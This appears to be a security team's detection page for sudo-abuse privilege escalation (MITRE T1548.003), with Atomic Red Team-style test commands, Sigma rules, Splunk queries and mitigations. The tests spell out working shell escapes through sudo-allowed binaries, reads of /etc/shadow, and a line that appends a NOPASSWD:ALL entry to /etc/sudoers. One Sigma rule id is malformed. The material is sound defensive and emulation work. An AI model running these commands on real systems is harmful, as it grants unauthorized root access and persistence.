---
Tactic: Privilege Escalation, Defense Evasion
Technique: Abuse Elevation Control Mechanism
Subtechnique: Sudo and Sudo Caching
TechniqueID: T1548.003
Platform: MacOS, Linux
Executor: Shell
Elevation Required: true
tags:
  - Privilege_Escalation
  - Defense_Evasion
  - T1548
  - T1548_003
  - Abuse_Elevation_Control_Mechanism
  - Sudo_and_Sudo_Caching
  - MacOS
  - linux
  - shells
  - Elevation_Required
---

## Description
Adversaries may perform sudo caching and/or use the sudoers file to elevate privileges. Adversaries may replicate the behavior of the sudo caching vulnerability or manipulate the sudoers configuration to execute commands with elevated privileges.

The sudo command allows users to run programs with elevated privileges. The sudoers file controls which users can run what commands as which user. Adversaries may exploit sudo caching features (cached timestamps) to execute commands with elevated privileges without re-authenticating, or they may edit the sudoers file to grant themselves unauthorized privileges.
## Pre-requisites and Dependencies
- Shell terminal access
- sudo installed on the system
- User account with sudo privileges (or ability to modify sudoers file)

**Install sudo if not present:**
```sh
if [ ! -x "$(command -v sudo)" ]; then 
	(which pkg && pkg install -y sudo) || (which apt-get && apt-get install -y sudo) || (which yum && yum install -y sudo); 
else 
	exit 0; 
fi;
```

---

## Test Cases (Atomic Red Team)

### Test 1: Sudo Enumeration
**Description:** List sudo privileges for the current user
```sh
sudo -l
```

### Test 2: Sudo Configuration File Access
**Description:** Read sudo configuration file to identify privilege escalation opportunities
```sh
sudo cat /etc/sudoers
cat /etc/sudoers.d/*
```

### Test 3: Sudo Caching Exploitation
**Description:** Exploit sudo credential caching (default 15 minutes)
```sh
# First, authenticate with sudo
sudo whoami

# Within the timeout period (default 15 min), run privileged commands without re-authentication
sudo cat /etc/shadow
sudo bash
```

### Test 4: Sudo with NOPASSWD Abuse
**Description:** Execute commands via sudo entries that don't require password
```sh
# If sudoers has NOPASSWD entries, exploit them
sudo -u root /usr/bin/find /etc -exec /bin/sh \;
sudo -u root /usr/bin/vim -c ':!/bin/sh'
```

### Test 5: Sudoers File Modification
**Description:** Modify sudoers file to grant unauthorized privileges (requires write access)
```sh
# Add user to sudoers with ALL privileges
echo "attacker ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers

# Or use visudo (safer method)
sudo visudo
```

### Test 6: Sudo Token Manipulation  
**Description:** Attempt to manipulate sudo timestamp files
```sh
# Check timestamp directory
ls -la /var/db/sudo/lectured
ls -la /var/run/sudo/ts

# Attempt to extend sudo session
touch /var/db/sudo/$(whoami)
```

### Test 7: Sudo Binary Exploitation
**Description:** Execute shell through sudo-allowed binaries
```sh
# Common sudo-exploitable binaries
sudo /usr/bin/less /etc/profile
# In less, type: !sh

sudo /usr/bin/awk 'BEGIN {system("/bin/sh")}'
sudo /usr/bin/find /etc -exec /bin/sh \; -quit
sudo /usr/bin/python -c 'import pty;pty.spawn("/bin/bash")'
```

---

## Detection

### Sigma Rule
```yml
title: Suspicious Sudo Usage and Configuration Access
id: 8d8a8d91-7b4c-4c8f-9e4a-1f3c4d5e6f7a
status: experimental
description: Detects suspicious sudo command usage, sudoers file access, and potential privilege escalation attempts
references:
    - https://attack.mitre.org/techniques/T1548/003/
    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.003/T1548.003.md
author: SMALS SOC
date: 2026/02/25
modified: 2026/02/25
tags:
    - attack.privilege_escalation
    - attack.defense_evasion
    - attack.t1548.003
logsource:
    product: linux
    service: auditd
detection:
    selection_sudo_enum:
        type: 'EXECVE'
        a0: 'sudo'
        a1: '-l'
    selection_sudoers_read:
        type: 'EXECVE'
        a0|contains:
            - 'cat'
            - 'less'
            - 'more'
            - 'tail'
            - 'head'
        a1|contains: '/etc/sudoers'
    selection_sudoers_edit:
        type: 'EXECVE'
        a0|contains:
            - 'vim'
            - 'vi'
            - 'nano'
            - 'emacs'
        a1|contains: '/etc/sudoers'
    selection_sudo_shell:
        type: 'EXECVE'
        a0: 'sudo'
        a1|contains:
            - 'bash'
            - 'sh'
            - '/bin/sh'
            - '/bin/bash'
            - 'zsh'
    selection_sudo_exploitable:
        type: 'EXECVE'
        a0: 'sudo'
        a1|contains:
            - 'find'
            - 'awk'
            - 'python'
            - 'perl'
            - 'ruby'
            - 'less'
            - 'more'
            - 'vim'
        a2|contains:
            - '-exec'
            - 'system'
            - 'BEGIN'
            - '!sh'
    condition: 1 of selection_*
falsepositives:
    - Legitimate system administration
    - Automated configuration management tools
    - Security audits
level: medium
```

### Sigma Rule (Alternative - Syslog based)
```yml
title: Sudo Command Execution Monitoring
id: 9e9b9e92-8c5d-4d9f-af5b-2g4d5e6f8b8c
status: experimental
description: Monitors sudo command executions from system logs
references:
    - https://attack.mitre.org/techniques/T1548/003/
author: SMALS SOC
date: 2026/02/25
tags:
    - attack.privilege_escalation
    - attack.t1548.003
logsource:
    product: linux
    service: syslog
detection:
    selection:
        message|contains|all:
            - 'sudo'
            - 'COMMAND='
    filter_legitimate:
        message|contains:
            - 'package update'
            - 'systemctl'
    condition: selection and not filter_legitimate
falsepositives:
    - Regular administrative activities
level: low
```

---

### Splunk Query

**Basic Sudo Activity Monitoring:**
```spl
index=linux sourcetype=linux_secure OR sourcetype=linux_audit OR sourcetype=syslog
| search ("sudo" AND ("COMMAND=" OR "USER=" OR "-l"))
| rex field=_raw "(?<sudo_user>\w+)\s+:\s+TTY=(?<tty>[^\s]+)\s+;\s+PWD=(?<pwd>[^\s]+)\s+;\s+USER=(?<target_user>[^\s]+)\s+;\s+COMMAND=(?<command>.*)"
| eval risk_score=case(
    match(command, "(?i)(bash|sh|zsh)"), 80,
    match(command, "(?i)(visudo|/etc/sudoers)"), 90,
    match(command, "(?i)(find.*-exec|awk.*system|python.*pty)"), 95,
    match(command, "(?i)(-l)"), 40,
    1=1, 30
  )
| where risk_score > 50
| table _time sudo_user tty target_user command risk_score
| sort -risk_score
```

**Sudoers File Access Detection:**
```spl
index=linux sourcetype=linux_audit type=EXECVE
| search (a0="cat" OR a0="vim" OR a0="vi" OR a0="nano" OR a0="less") AND a1="/etc/sudoers*"
| stats count by _time host a0 a1 uid
| eval action=a0." ".a1
| table _time host uid action count
| sort -_time
```

**Sudo Privilege Escalation Attempts:**
```spl
index=linux sourcetype=linux_secure 
| search "sudo" AND ("COMMAND=" OR "incorrect password")
| rex field=_raw "(?<timestamp>\w+\s+\d+\s+\d+:\d+:\d+)\s+(?<host>\S+)\s+sudo.*?(?<user>\w+)\s+:.*COMMAND=(?<command>.*)"
| eval suspicious=case(
    match(command, "(?i)(bash|sh|/bin/)"), "Shell Execution",
    match(command, "(?i)(/etc/shadow|/etc/passwd)"), "Password File Access",
    match(command, "(?i)(find.*exec|awk.*system)"), "Command Injection",
    match(command, "(?i)(visudo|sudoers)"), "Config Modification",
    1=1, "Normal"
  )
| where suspicious!="Normal"
| stats count by _time host user command suspicious
| sort -_time
```

**Sudo Session Analysis (Caching Detection):**
```spl
index=linux sourcetype=linux_secure sudo
| transaction host user maxspan=15m
| where eventcount > 5
| eval rapid_sudo_usage=if(eventcount > 5, "Potential Credential Caching Abuse", "Normal")
| table _time host user eventcount duration rapid_sudo_usage
| where rapid_sudo_usage="Potential Credential Caching Abuse"
```

---

## Mitigation Strategies

1. **Restrict sudo privileges:** Only grant sudo access to trusted users and specific commands
2. **Disable sudo caching:** Set `timestamp_timeout=0` in sudoers to require password for each sudo command
3. **Use `PASSWD` instead of `NOPASSWD`:** Require password authentication for sudo commands
4. **Monitor sudoers file:** Implement file integrity monitoring on `/etc/sudoers` and `/etc/sudoers.d/`
5. **Audit sudo usage:** Enable comprehensive logging via auditd or syslog
6. **Principle of least privilege:** Grant only necessary commands via sudoers, not `ALL`
7. **Regular reviews:** Periodically review sudoers configurations for unauthorized changes

---

## References
- **MITRE ATT&CK:** [T1548.003 - Sudo and Sudo Caching](https://attack.mitre.org/techniques/T1548/003/)
- **Atomic Red Team:** [T1548.003 Tests](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.003/T1548.003.md)
- **GTFOBins:** [Sudo Exploitation Methods](https://gtfobins.github.io/)
- **sudoers Manual:** `man sudoers`